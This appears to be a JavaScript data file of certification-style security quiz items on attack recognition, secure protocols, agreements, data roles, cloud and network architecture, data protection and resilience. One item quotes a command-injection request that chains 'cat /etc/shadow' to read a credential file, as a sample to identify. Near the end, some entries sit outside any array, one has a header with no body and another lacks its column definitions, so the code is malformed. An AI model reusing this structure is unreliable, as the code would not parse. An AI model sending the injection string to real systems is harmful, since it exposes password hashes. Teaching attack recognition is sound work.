  {fx:["GET /ping?host=8.8.8.8;cat%20/etc/shadow"],a:["Command injection"],why:"The ; ends the intended command and chains an OS command. It targets the server's shell, not the database."},
  {fx:["GET /search?q=red+running+shoes"],a:["Normal"],why:"An ordinary search."}],
 f:"Spot the tell: a quote plus SQL keywords = SQLi; ../ = traversal; <script> = XSS; ; or | plus an OS command = command injection."},

{id:"p-protocols",d:4,o:"4.5",type:"table",t:"Secure protocol replacements",
 q:"An audit flagged these insecure protocols. Choose the secure replacement for each, and the port it uses by default.",
 fixed:["Insecure protocol"],
 cols:[{h:"Secure replacement",o:["SSH","HTTPS","SFTP","LDAPS","SNMPv3","DNSSEC"]},{h:"Port",o:["22","53","161","443","636","989/990"]}],
 rows:[
  {fx:["Telnet (23)"],a:["SSH","22"],why:"SSH replaces Telnet with an encrypted remote shell on TCP 22."},
  {fx:["HTTP (80)"],a:["HTTPS","443"],why:"HTTP over TLS, on TCP 443."},
  {fx:["FTP (20/21)"],a:["SFTP","22"],why:"SFTP runs over SSH, so it uses 22. FTPS (FTP over TLS) is the one that uses 989/990."},
  {fx:["LDAP (389)"],a:["LDAPS","636"],why:"LDAP over TLS uses TCP 636."},
  {fx:["SNMPv1 / v2c (161)"],a:["SNMPv3","161"],why:"SNMPv3 adds authentication and encryption, but keeps port 161 (and 162 for traps)."},
  {fx:["DNS (53)"],a:["DNSSEC","53"],why:"DNSSEC adds signatures to DNS records. It's still DNS on port 53. It guarantees integrity, not secrecy."}],
 f:"Most secure versions just wrap the old protocol in TLS or SSH. Ports that stay the same: SNMPv3 (161) and DNSSEC (53). SFTP borrows SSH's 22."},

{id:"p-agree",d:5,o:"5.3",type:"table",t:"Pick the right agreement",
 q:"Choose the agreement that fits each situation.",
 fixed:["Situation"],
 cols:[{h:"Agreement",o:["MOU","MOA","SLA","SOW","MSA","NDA","BPA"]}],
 rows:[
  {fx:["Two companies want to record that they INTEND to work together, before any lawyers get involved"],a:["MOU"],why:"Informal and usually non-binding: a statement of intent."},
  {fx:["Two agencies formally list which one supplies staff and which supplies equipment for a shared team"],a:["MOA"],why:"More formal than an MOU, with specific responsibilities and conditions."},
  {fx:["A cloud provider guarantees 99.95% uptime, with service credits if it misses"],a:["SLA"],why:"Measurable service levels, with penalties."},
  {fx:["A vendor defines the deliverables and timeline for one specific project"],a:["SOW"],why:"Scope, deliverables and timeline for a single engagement."},
  {fx:["A company negotiates payment and liability terms ONCE for years of future projects"],a:["MSA"],why:"The umbrella contract that future SOWs fall under."},
  {fx:["A vendor must keep unreleased product designs secret"],a:["NDA"],why:"Confidentiality only."},
  {fx:["Partners document how profits, losses and responsibilities are split"],a:["BPA"],why:"Governs an actual business partnership."}],
 f:"Intent = MOU. Responsibilities = MOA. Metrics = SLA. One project = SOW. Umbrella = MSA. Secrets = NDA. Partners = BPA."},

{id:"p-droles",d:5,o:"5.1",type:"table",t:"Assign data roles",
 q:"An online store handles customer data. Assign the correct data role to each person or organization.",
 fixed:["Who"],
 cols:[{h:"Role",o:["Data owner","Data custodian","Data steward","Data controller","Data processor","Data subject"]}],
 rows:[
  {fx:["The VP of Sales, who decides the customer list is 'Confidential' and approves who can access it"],a:["Data owner"],why:"Accountable for the data set: sets its classification and approves access."},
  {fx:["The DBA who runs backups and applies the approved permissions"],a:["Data custodian"],why:"Hands-on technical care, following the owner's decisions."},
  {fx:["The analyst who keeps customer records accurate and consistently labeled"],a:["Data steward"],why:"Data quality, labeling and metadata."},
  {fx:["The store itself, which decides why and how customer data is used"],a:["Data controller"],why:"Decides the purpose and means of processing, and is legally accountable under GDPR."},
  {fx:["The outside email service that sends marketing emails on the store's instructions"],a:["Data processor"],why:"Processes the data on the controller's behalf."},
  {fx:["A customer whose name and address are in the database"],a:["Data subject"],why:"The person the data is about."}],
 f:"Owner decides, custodian maintains, steward keeps it clean, controller sets the purpose, processor follows instructions, subject is who it's about."}
];


// Wave 4b — Domain 3 expansion (architecture, infrastructure, data protection, resilience)
DECK.push(
// ---------- 3.1 Architecture models ----------
{id:"respmatrix",d:3,o:"3.1",g:"cloud",t:"Cloud responsibility matrix (shared responsibility)",
 f:"Who secures what depends on the service model. IaaS: the customer handles the OS, apps and data; the provider handles hardware and the facility. PaaS: the provider also runs the OS and platform. SaaS: the provider runs almost everything. The customer ALWAYS owns its data, accounts and access.",
 q:"A company moves to SaaS email. Which security responsibility does the company STILL keep?",
 a:["Managing user accounts and access to its data","Patching the mail server operating system","Securing the physical data center","Maintaining the provider's network hardware"],
 w:["","In SaaS the provider patches the OS and application.","Physical security belongs to the provider in every cloud model.","The provider owns and maintains its network hardware."],
 c:"customer always owns data + identities"},
{id:"iac",d:3,o:"3.1",g:"cloud",t:"Infrastructure as code (IaC)",
 f:"Defining servers, networks and applications as code files, versioned like software, so environments are built identically and repeatably every time. Cuts configuration drift and manual mistakes.",
 q:"A cloud team wants every new environment built exactly the same way from versioned template files, instead of clicking through consoles by hand. What approach is this?",
 a:["Infrastructure as code","Serverless architecture","Software-defined WAN","Multi-tenancy"],
 w:["","Serverless removes server management for functions; it isn't about defining whole environments as templates.","SD-WAN manages WAN connectivity to the cloud.","Multi-tenancy is customers sharing infrastructure."],
 c:"environment defined in versioned files"},
{id:"sdn",d:3,o:"3.1",g:"plane",t:"SDN (Software-Defined Networking)",
 f:"Splits network functions into separate logical planes: data plane (forwards packets), control plane (routing decisions, tables) and management plane (configure the device via SSH, browser or API). Lets the network be centrally and programmatically managed. Built for the cloud.",
 q:"A company wants to manage its entire network centrally through software and APIs, separating the decision-making functions from the packet-forwarding hardware. Which technology fits?",
 a:["SDN","SD-WAN","VLANs","Air gap"],
 w:["","SD-WAN applies the idea to WAN links to the cloud. The general split of network planes is SDN.","VLANs segment traffic logically; they don't separate control from forwarding.","An air gap physically isolates networks."],
 c:"control / data / management split, run by software"},
{id:"airgap",d:3,o:"3.1",g:"seg",t:"Air gap / physical isolation",
 f:"Systems physically separated, with no network connection at all to other networks. Strongest isolation, but data must move by hand (removable media, which is its own risk).",
 q:"A nuclear plant's control network must have NO network connection to the corporate network or internet, not even through a firewall. What is this?",
 a:["Air gap","VLAN segmentation","Screened subnet","Microsegmentation with a firewall"],
 w:["","VLANs share physical switches and are separated only logically.","A screened subnet (DMZ) still connects through firewalls.","Microsegmentation still relies on network connections and firewall rules."],
 c:"NO connection at all"},
{id:"vlanseg",d:3,o:"3.1",g:"seg",t:"Logical segmentation (VLANs)",
 f:"VLANs separate traffic logically on the same physical switches. Devices in different VLANs can't talk without a layer 3 device (a router or firewall) between them, where you can apply rules.",
 q:"A company wants to separate guest, VoIP and employee traffic on the SAME physical switches, and force any traffic between them through a router with access rules. What should it use?",
 a:["VLANs","Air gap","Separate physical switches per group","A forward proxy"],
 w:["","An air gap means no connection at all, which isn't what's wanted here.","Separate switches would work, but the requirement is to use the same physical hardware.","A forward proxy handles users' outbound web requests."],
 c:"same switches, separated logically"},
{id:"centarch",d:3,o:"3.1",g:"cloud",t:"Centralized vs decentralized security management",
 f:"Most organizations are physically decentralized (many sites, clouds, OSes). Centralizing security management gives correlated alerts, consolidated logs and one view of patching, but creates a single point of failure and possible performance bottleneck.",
 q:"A company pulls logs, alerts and patch status from all 40 sites into one central console. What is the MAIN trade-off to plan for?",
 a:["The central system becomes a single point of failure","Alerts can no longer be correlated","Each site loses the ability to be patched","Logs become impossible to analyze"],
 w:["","Correlating alerts is the main BENEFIT of centralizing.","Centralizing management doesn't stop patching; it improves visibility of it.","Consolidated logs are easier to analyze, not harder."],
 c:"benefit: one view · risk: single point of failure"},
{id:"nopatch",d:3,o:"3.1",g:"embedded",t:"Inability to patch",
 f:"Some systems can't be patched: embedded devices, HVAC controllers, time clocks, medical devices, legacy equipment. Protect them with compensating controls instead: segmentation, firewalls in front of them, and monitoring.",
 q:"A building's HVAC controllers run firmware the vendor will never update. What is the BEST way to reduce their risk?",
 a:["Isolate them on a segmented network behind a firewall","Install antivirus on each controller","Patch them monthly with the OS updates","Accept them onto the corporate VLAN with other devices"],
 w:["","These embedded controllers usually can't run antivirus agents.","The point is that they CAN'T be patched.","Putting them on the corporate VLAN increases exposure."],
 c:"can't patch → wall it off"},
// ---------- 3.2 Infrastructure: placement, failure, monitoring ----------
{id:"zones",d:3,o:"3.2",g:"place",t:"Device placement and security zones",
 f:"Group network areas into zones (trusted, untrusted, internal, screened subnet/DMZ) and write policy between zones. Public-facing servers go in the screened subnet, between the internet firewall and the internal network.",
 q:"A company is adding a public web server. Where should it be placed so internet users can reach it without gaining a path straight into the internal network?",
 a:["In a screened subnet (DMZ)","On the internal user VLAN","Directly on the internet with no firewall","On the same subnet as the database servers"],
 w:["","Internet traffic reaching the internal VLAN is exactly what you want to avoid.","No firewall means no protection or filtering at all.","Putting it next to the databases gives an attacker a short hop to your crown jewels."],
 c:"public-facing → screened subnet"},
{id:"failmode",d:3,o:"3.2",g:"place",t:"Fail-open vs fail-closed",
 f:"Fail-open = when the device fails, traffic keeps flowing (availability first, security lost). Fail-closed = when it fails, traffic stops (security first, availability lost).",
 q:"An inline IPS protecting a hospital's patient-records system crashes, and all traffic through it stops until it's repaired. How was the IPS configured?",
 a:["Fail-closed","Fail-open","Passive monitoring","Active/active load balancing"],
 w:["","Fail-open would have let traffic keep flowing, uninspected.","A passive monitor sits off to the side and can't stop traffic when it fails.","Load balancing distributes traffic across servers."],
 c:"fails → traffic STOPS = closed"},
{id:"inline",d:3,o:"3.2",g:"place",t:"Active (inline) vs passive monitoring",
 f:"Active/inline = the device sits in the traffic path and can block in real time (typical IPS). Passive = it gets a COPY of traffic from a network tap or port mirror (SPAN) and can only alert (typical IDS).",
 q:"A sensor receives a copy of traffic from a switch's port mirror. What can it do when it sees an attack?",
 a:["Alert, but not block the traffic","Block the traffic in real time","Rewrite the malicious packets","Shut down the switch port automatically, inline"],
 w:["","Blocking in real time requires being inline in the traffic path.","Modifying traffic also requires being inline.","It isn't inline, so it can't act on the live flow."],
 c:"copy of traffic = watch + alert only"},
{id:"jumpsrv",d:3,o:"3.2",g:"appl",t:"Jump server",
 f:"A hardened, closely monitored host that admins connect to first (via SSH, RDP or VPN), and from which they reach a protected zone. One controlled entry point, but if it's compromised, that's a major breach.",
 q:"Admins must never connect directly to servers in a secure zone. Instead, they connect to one hardened, monitored host and manage the servers from there. What is that host?",
 a:["Jump server","Reverse proxy","Load balancer","Honeypot"],
 w:["","A reverse proxy handles inbound requests to internal services for outside users.","A load balancer spreads traffic across servers.","A honeypot is a decoy meant to attract attackers."],
 c:"admins hop through one hardened box"},
{id:"fwdproxy",d:3,o:"3.2",g:"appl",t:"Forward proxy",
 f:"Sits between INTERNAL users and the internet, making requests on their behalf. Used for URL filtering, content scanning, caching and access control. Explicit = apps are configured to use it; transparent = invisible to users. An open proxy is a third-party proxy used to bypass controls.",
 q:"A company routes all employee web browsing through a server that makes requests on their behalf, caching pages and blocking prohibited URLs. What is this?",
 a:["Forward proxy","Reverse proxy","Jump server","VPN concentrator"],
 w:["","A reverse proxy sits in front of your SERVERS for inbound requests.","A jump server is for admins reaching secure zones.","A VPN concentrator terminates encrypted tunnels."],
 c:"internal users → internet, on their behalf"},
{id:"revproxy",d:3,o:"3.2",g:"appl",t:"Reverse proxy",
 f:"Sits in front of internal SERVERS and receives inbound requests from the internet, passing them on. Hides the real servers, and can add caching, TLS offload and filtering.",
 q:"Internet users reach a company's web app through a server that receives their requests and forwards them to hidden internal web servers. What is that server?",
 a:["Reverse proxy","Forward proxy","Open proxy","Jump server"],
 w:["","A forward proxy handles outbound requests from internal users.","An open proxy is an uncontrolled third-party proxy, often used to dodge controls.","A jump server is an admin access point."],
 c:"internet → your servers (inbound)"},
{id:"lbmode",d:3,o:"3.2",g:"appl",t:"Load balancer: active/active vs active/passive",
 f:"Spreads traffic across multiple servers so users never notice an outage. Active/active = all servers handle load (also offers TLS offload, caching, content switching). Active/passive = standby servers take over only when an active one fails.",
 q:"Two web servers sit behind a load balancer. Only one handles traffic; the second sits idle and takes over automatically if the first fails. Which configuration is this?",
 a:["Active/passive","Active/active","Clustering with shared storage","Round-robin DNS"],
 w:["","In active/active, both servers carry traffic at the same time.","Clustering makes servers act as one big system. The clue here is an idle standby.","Round-robin DNS spreads requests across all servers; there's no standby."],
 c:"one works, one waits"},
{id:"collectors",d:3,o:"3.2",g:"appl",t:"Sensors and collectors",
 f:"Sensors generate security data: IPS alerts, firewall logs, authentication logs, web access logs, database transaction logs. Collectors gather it in one place: SIEM, syslog server, vendor consoles. SIEMs correlate data across sensors.",
 q:"In a monitoring design, firewalls, IPSs and web servers send their logs to a syslog server and SIEM. In this design, the syslog server and SIEM are acting as what?",
 a:["Collectors","Sensors","Jump servers","Reverse proxies"],
 w:["","Sensors are the SOURCES of the data, here the firewalls, IPSs and web servers.","Jump servers are admin access points.","Reverse proxies handle inbound web requests."],
 c:"sensors produce, collectors gather"},
{id:"eap",d:3,o:"3.2",g:"nac",t:"802.1X roles: supplicant, authenticator, authentication server",
 f:"Supplicant = the client device asking for access. Authenticator = the switch or access point that controls the port. Authentication server = checks the credentials (usually RADIUS, against LDAP, AD and so on). EAP is the authentication framework carried inside.",
 q:"In an 802.1X deployment, which component is the wireless access point that blocks the client's network access until authentication succeeds?",
 a:["Authenticator","Supplicant","Authentication server","Certificate authority"],
 w:["","The supplicant is the client device requesting access.","The authentication server (RADIUS) validates the credentials; it doesn't sit at the port.","A CA issues certificates and isn't one of the three 802.1X roles."],
 c:"switch/AP at the door = authenticator"},
{id:"utm",d:3,o:"3.2",g:"fw",t:"UTM (Unified Threat Management)",
 f:"An all-in-one security appliance: firewall, IDS/IPS, URL filtering, content and malware inspection, spam filter, VPN endpoint, bandwidth shaping and routing. Simple for small offices, but a single point of failure and potential bottleneck.",
 q:"A small office wants ONE appliance that provides firewalling, IPS, spam filtering, URL filtering and a VPN endpoint. What should it buy?",
 a:["UTM appliance","WAF","Reverse proxy","Jump server"],
 w:["","A WAF protects web applications specifically.","A reverse proxy fronts internal web servers.","A jump server is an admin access host."],
 c:"many security functions, one box"},
{id:"ngfw",d:3,o:"3.2",g:"fw",t:"NGFW (next-generation firewall)",
 f:"An application-aware firewall working at layer 7: identifies applications regardless of port (SQL Server, YouTube), applies app-specific IPS signatures, and filters URLs by category. Also called an application layer gateway or deep packet inspection firewall.",
 q:"A company wants to allow Microsoft Teams but block YouTube and personal file-sharing apps, even though they all use port 443. Which firewall can do this?",
 a:["Next-generation firewall","Packet-filtering firewall","Stateless ACL on a router","Transparent layer 2 bridge with port rules"],
 w:["","Packet filters only see IP addresses and ports, and all three apps use 443.","A stateless ACL works on addresses and ports too.","A port rule can't tell apps apart on the same port."],
 c:"identify the APP, not the port"},
// ---------- 3.2 Secure communication ----------
{id:"sslvpn",d:3,o:"3.2",g:"vpn",t:"SSL/TLS VPN vs IPsec VPN",
 f:"SSL/TLS VPN: runs over TCP 443 (passes most firewalls), uses a browser or light client, and is typical for remote USER access. IPsec: typical for always-on SITE-TO-SITE tunnels, often between firewalls acting as VPN concentrators.",
 q:"Traveling employees need remote access from hotel networks that block most ports, using a lightweight client or browser. Which VPN type fits BEST?",
 a:["SSL/TLS VPN","Site-to-site IPsec VPN","SD-WAN","Air-gapped connection"],
 w:["","Site-to-site IPsec connects whole networks and may be blocked by restrictive hotel firewalls.","SD-WAN optimizes WAN links between sites and the cloud; it isn't a remote user VPN.","An air gap means no connection at all."],
 c:"remote users through 443 = SSL/TLS"},
{id:"sdwan",d:3,o:"3.2",g:"vpn",t:"SD-WAN",
 f:"Software-defined WAN: lets branch offices reach cloud apps directly and efficiently over multiple links, instead of backhauling everything through a central data center. Manages connectivity, but doesn't by itself provide full security.",
 q:"Branch offices send all cloud-app traffic through headquarters first, making Microsoft 365 slow. The company wants branches to route cloud traffic directly and intelligently over their local links. What should it deploy?",
 a:["SD-WAN","Site-to-site IPsec to headquarters","An air gap","A jump server"],
 w:["","Tunneling everything to HQ is the slow backhaul they're trying to get rid of.","An air gap removes connectivity entirely.","A jump server is for admin access."],
 c:"branches go direct to the cloud"},
{id:"sase",d:3,o:"3.2",g:"vpn",t:"SASE (Secure Access Service Edge)",
 f:"Cloud-delivered networking (SD-WAN) and security (secure web gateway, CASB, firewall as a service, zero trust network access) combined, with a client on every device. A next-generation VPN placed close to cloud services.",
 q:"A company with remote workers everywhere wants networking plus security services such as web gateway, CASB, firewall and zero trust access delivered from the cloud close to users, with a client on every device. What is this?",
 a:["SASE","SD-WAN alone","UTM appliance at headquarters","Site-to-site IPsec"],
 w:["","SD-WAN handles connectivity but doesn't fully address security. SASE adds the security stack.","A UTM is one physical box at one site, not cloud-delivered to users everywhere.","Site-to-site IPsec links fixed networks, not individual users anywhere."],
 c:"network + security AS A SERVICE from the cloud"},
// ---------- 3.3 Data ----------
{id:"dtypes",d:3,o:"3.3",g:"dclass",t:"Data types",
 f:"Regulated (governed by laws, e.g. PII, PHI, card data), trade secret (secret formulas, unique to the org), intellectual property (often public but protected by copyright or trademark), legal (court records), financial (company and customer finances, payment records).",
 q:"A beverage company's unpublished recipe, which gives it a competitive edge and is known only to a few employees, is BEST classified as what type of data?",
 a:["Trade secret","Intellectual property protected by copyright","Regulated data","Public data"],
 w:["","Copyrighted IP is often publicly visible but legally protected. A secret recipe's value is that it's NOT disclosed.","Regulated data is governed by laws such as HIPAA or PCI DSS, not a company's own recipe.","It's the opposite of public."],
 c:"secret + competitive edge"},
{id:"dclass",d:3,o:"3.3",g:"dclass",t:"Data classifications",
 f:"Public/unclassified = no restrictions. Private/restricted = limited access, may need an NDA. Sensitive = IP, PII, PHI. Confidential = very sensitive, viewing must be approved. Critical = must always be available. Proprietary = owned by the org.",
 q:"A label requires that the data must ALWAYS be available to the business, regardless of how secret it is. Which classification does this describe?",
 a:["Critical","Confidential","Public","Proprietary"],
 w:["","Confidential is about restricting who can view it, not availability.","Public means no viewing restrictions.","Proprietary means owned by the organization."],
 c:"must ALWAYS be available"},
{id:"piiphi",d:3,o:"3.3",g:"dclass",t:"PII vs PHI",
 f:"PII = data that identifies a person (name, date of birth, biometrics, mother's maiden name). PHI = health information tied to a person (health status, care records, payments for health care), protected by laws like HIPAA.",
 q:"A clinic's billing records link each patient's name to their diagnoses and payments for treatment. What type of data is this MOST specifically?",
 a:["PHI","PII only","Trade secret","Public data"],
 w:["","It contains PII, but health information tied to a person is more specifically PHI.","Patient records aren't the clinic's competitive secret.","Patient records are highly restricted."],
 c:"identity + HEALTH = PHI"},
{id:"datarest",d:3,o:"3.3",g:"dstate",t:"Data at rest vs in transit",
 f:"At rest = stored (drives, databases, backups): protect with full-disk, database or file encryption plus permissions. In transit = moving over a network: protect with TLS, IPsec, firewalls and IPS. In use = in memory, usually decrypted, so restrict access.",
 q:"A company encrypts its database files on disk. Which state of data does this protect?",
 a:["Data at rest","Data in transit","Data in use","Data in motion"],
 w:["","In transit means moving across the network, protected with TLS or IPsec.","In use means in memory while being processed, usually decrypted.","'In motion' is just another name for in transit."],
 c:"stored on disk = at rest"},
{id:"geofence",d:3,o:"3.3",g:"dstate",t:"Geolocation and geofencing",
 f:"Geolocation determines where a user is: GPS (most accurate), Wi-Fi (less), IP address (least). Geofencing automatically allows or blocks access based on location, such as an app that works only inside the building, or blocking logins from other countries.",
 q:"A company's admin portal should only work when the admin's device is physically inside headquarters. What should it implement?",
 a:["Geofencing","Data masking","Tokenization","Air gap"],
 w:["","Masking hides part of displayed data.","Tokenization replaces sensitive values with placeholders.","An air gap removes all network connectivity, not location-based access."],
 c:"location decides access"},
// ---------- 3.4 Resilience ----------
{id:"ha",d:3,o:"3.4",g:"resil",t:"High availability vs redundancy",
 f:"Redundancy = having spare components, which may need to be switched on manually. High availability = always on and automatically available, often active/active. Higher availability almost always costs more.",
 q:"A company keeps a spare server in a closet that staff must power on and configure if the primary fails. What does this provide?",
 a:["Redundancy, but not high availability","High availability","Active/active load balancing","Geographic dispersion"],
 w:["","HA means automatic, always-on failover. A manual closet spare isn't that.","Active/active means both servers carry load at the same time.","Both servers are in the same building."],
 c:"spare ≠ always on"},
{id:"cluster",d:3,o:"3.4",g:"resil",t:"Server clustering vs load balancing",
 f:"Clustering = two or more servers act as ONE system and are aware of each other, usually running the same OS, configured in the OS. Load balancing = a separate device spreads requests across servers that are often unaware of each other and can run different OSes.",
 q:"Several database servers, all running the same OS, are configured to appear to users as a single large server and share the workload. Which resilience technique is this?",
 a:["Clustering","Load balancing across independent web servers","Cold site","Journaling"],
 w:["","With a load balancer, the servers are typically independent and unaware of each other.","A cold site is an empty recovery facility.","Journaling protects writes from corruption."],
 c:"servers act as ONE"},
{id:"platdiv",d:3,o:"3.4",g:"resil",t:"Platform diversity and multi-cloud",
 f:"Platform diversity = using different OSes and platforms so one vulnerability can't take out everything. Multi-cloud = spreading across providers (AWS, Azure, Google Cloud) so one provider's outage or breach doesn't stop the business.",
 q:"A company runs critical services on both AWS and Azure so an outage at one provider won't stop the business. What is this?",
 a:["Multi-cloud","Hybrid cloud","Single-tenant cloud","Geofencing"],
 w:["","Hybrid mixes private and public cloud. Two PUBLIC providers for resilience is multi-cloud.","Single-tenant means dedicated hardware at one provider.","Geofencing controls access by location."],
 c:"more than one provider"},
{id:"coop",d:3,o:"3.4",g:"resil",t:"Continuity of operations planning (COOP)",
 f:"Documented and tested alternative ways to keep the business running when technology fails: manual transactions, paper receipts, phone approvals.",
 q:"A store's plan says that if the payment system goes down, staff switch to paper receipts and phone-in card approvals. What does this plan represent?",
 a:["Continuity of operations planning","Capacity planning","Journaling","Platform diversity"],
 w:["","Capacity planning matches resources to demand.","Journaling protects data writes from corruption.","Platform diversity spreads risk across different OSes."],
 c:"keep the business running, manually if needed"},
{id:"capplan",d:3,o:"3.4",g:"resil",t:"Capacity planning",
 f:"Matching supply to demand across people, technology and infrastructure. Too little leads to slowdowns and outages; too much wastes money. Cloud resources make scaling up or down easier.",
 q:"Every holiday season a retailer's site slows down from traffic, and its call center can't keep up. Which planning area should it improve?",
 a:["Capacity planning","Continuity of operations","Data classification","Change ownership"],
 w:["","COOP covers how to operate when systems fail, not routinely having enough capacity.","Classification labels data by sensitivity.","Ownership is about who manages a change."],
 c:"supply vs demand"},
{id:"rtesting",d:3,o:"3.4",g:"resil",t:"Recovery testing methods",
 f:"Tabletop = talk through a scenario. Fail over = actually switch to redundant systems. Simulation = stage a realistic event, such as a phishing test. Parallel processing = spread work across multiple processors or systems for performance and quick recovery (many study guides also use it for running a recovery system alongside production to test it).",
 q:"To test resilience, a company deliberately switches traffic from its primary firewall pair to the redundant pair and confirms service continues. Which recovery test is this?",
 a:["Fail over","Tabletop exercise","Simulation phishing test","Capacity planning"],
 w:["","A tabletop only talks through the scenario; nothing gets switched.","A phishing simulation tests users, not infrastructure failover.","Capacity planning matches resources to demand; it isn't a test."],
 c:"actually switch to the backup"},
{id:"snapshot",d:3,o:"3.4",g:"backup",t:"Snapshots",
 f:"An instant capture of an entire system's state (configuration and data), common with VMs and cloud. Later snapshots store only the changes since the previous one. You can revert quickly to any snapshot.",
 q:"Before a risky update, an admin wants to capture a VM's entire state in seconds so it can be reverted instantly if the update fails. What should they take?",
 a:["A snapshot","A journal entry","An off-site tape backup","A replication job to another site"],
 w:["","A journal protects individual writes from corruption; it isn't a whole-system revert point.","Tape is slow to create and restore.","Replication copies data continuously; it isn't a point-in-time revert."],
 c:"instant whole-system revert point"},
{id:"replication",d:3,o:"3.4",g:"backup",t:"Replication",
 f:"An ongoing, almost real-time copy of data to other locations, keeping them synchronized, so there's always an up-to-date copy elsewhere. Caution: corruption or deletion can replicate too.",
 q:"A company keeps a continuously synchronized, near real-time copy of its file server at a second data center. What is this?",
 a:["Replication","Snapshot","Journaling","Cold site"],
 w:["","A snapshot is a point-in-time capture, not continuous sync.","Journaling records pending writes on the same system to prevent corruption.","A cold site is an empty facility with no data."],
 c:"continuous near real-time copy elsewhere"},
{id:"journal",d:3,o:"3.4",g:"backup",t:"Journaling",
 f:"Before writing data to storage, write a journal entry; after the write finishes, clear the entry. If power fails mid-write, the system replays or rolls back from the journal instead of ending up with corrupted data.",
 q:"A file system records each pending write in a log before committing it, so a sudden power loss doesn't leave corrupted files. What is this feature?",
 a:["Journaling","Replication","Snapshots","Platform diversity"],
 w:["","Replication copies data to other locations.","Snapshots capture whole-system states over time.","Platform diversity uses different OSes to spread risk."],
 c:"log the write first, then write"},
{id:"offsite",d:3,o:"3.4",g:"backup",t:"On-site vs off-site backups, frequency and encryption",
 f:"On-site = fast, no internet link needed, cheaper, but lost in a site disaster. Off-site = survives the disaster, and you can restore from anywhere. Most organizations use both. Set frequency per system (daily, weekly, monthly), and encrypt backups, since they hold a full history of your data.",
 q:"A company's only backups sit on a NAS in the same server room. A fire destroys the room. What change would have prevented losing the data?",
 a:["Keeping an off-site backup copy","Backing up more frequently to the same NAS","Encrypting the on-site backups","Adding journaling to the file server"],
 w:["","More frequent backups to the same room burn just the same.","Encryption protects confidentiality, not survival in a fire.","Journaling prevents write corruption, not physical destruction."],
 c:"site disaster → need a copy ELSEWHERE"},
{id:"ups",d:3,o:"3.4",g:"power",t:"UPS (uninterruptible power supply)",
 f:"Short-term battery power through blackouts, brownouts and surges, long enough to ride out a blip, shut down cleanly or bridge until a generator starts. Types: offline/standby, line-interactive, online/double-conversion.",
 q:"When utility power fails, servers need power for the 30–60 seconds it takes the backup generator to start up. What fills that gap?",
 a:["UPS","Generator","Redundant ISP link","Cold site"],
 w:["","The generator is what's still starting up during that gap.","A second ISP keeps the internet up, not electrical power.","A cold site is an empty recovery facility."],
 c:"SHORT-term battery bridge"},
{id:"generator",d:3,o:"3.4",g:"power",t:"Generator",
 f:"Long-term backup power for a whole building or data center, running on stored fuel. Takes a few minutes to start, so a UPS bridges the gap.",
 q:"A data center must keep running through a multi-day regional power outage. What provides that power?",
 a:["Generator with fuel storage","UPS batteries alone","Surge protectors","Line-interactive UPS"],
 w:["","UPS batteries last minutes, not days.","Surge protectors only stop spikes; they supply no power.","Still a battery UPS, meant for short-term power only."],
 c:"LONG-term power = generator"}
);

{id:"p-placement",d:3,o:"3.2",type:"table",t:"Place devices in the right zone",

{id:"p-cryptopick",d:1,o:"1.4",type:"table",t:"Pick the crypto tool for the job",
 q:"Choose the technique that BEST meets each need. Each is used once.",

 rows:[
  {fx:["Encrypt 2 TB of backups quickly with low overhead"],a:["Symmetric encryption"],why:"One shared key, very fast. Built for bulk data."},
  {fx:["Securely send a secret to someone you've never exchanged keys with"],a:["Asymmetric encryption"],why:"Encrypt with their public key; only their private key decrypts it. No prior shared secret needed."},
  {fx:["Confirm a downloaded installer wasn't altered"],a:["Hashing"],why:"Compare the file's hash to the published value. Any change alters the hash."},
  {fx:["Prove the CFO approved a contract, so she can't deny it later"],a:["Digital signature"],why:"Signed with her private key: integrity, authentication and non-repudiation."},
  {fx:["Make two users with the same password store different hashes"],a:["Salting"],why:"Random per-user data is added before hashing, which defeats rainbow tables."},
  {fx:["Replace stored card numbers with useless placeholders"],a:["Tokenization"],why:"A token has no mathematical link to the real value, which lives in a secure vault."},
  {fx:["Hide a message inside an ordinary image file"],a:["Steganography"],why:"Concealed inside the covertext. Hidden, not necessarily encrypted."}],
 f:"Speed = symmetric. No shared secret = asymmetric. Unchanged? = hash. Who sent it + can't deny = signature. Same password, different hash = salt."},

{id:"p-resilience",d:3,o:"3.4",type:"table",t:"Resilience: match the solution",
